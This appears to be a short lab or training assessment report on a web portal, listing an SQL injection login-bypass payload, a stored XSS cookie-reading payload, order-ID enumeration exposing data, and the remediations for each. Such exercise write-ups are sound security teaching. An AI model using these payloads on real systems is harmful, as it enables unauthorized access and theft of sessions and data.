# OMNI-PORTAL ASSESSMENT REPORT
**Operator:** Franklin G **Deadline:** May 13 @ 11:59 PM 

## PHASE 1: AUTH BYPASS (SQLi)
* **Payload Used:** [' OR 1=1 --]
* **Result:** Successfully bypassed login and obtained 'auth_token' cookie.

## PHASE 2: CLIENT-SIDE HIJACK (XSS)
* **Stored XSS Payload:** [<script>alert(document.cookie);</script>]
* **Secret Cookie Captured:** [auth_token=SUPPORT_TIER_1_SECRET_TOKEN]

## PHASE 3: API ENUMERATION (BOLA)
* **Insecure Order ID:** [ID:501,502.503]
* **Confidential Data Leaked:** [{"amount":"$15,000.00","details":"Confidential Server Lease","order_id":501}]

## PHASE 4: THE REMEDIATION
* **Fix for SQLi:**Parameterized Queries.
* **Fix for XSS:**Output Encoding and Input Validation.
* **Fix for API BOLA:**Object-Level Authorization.
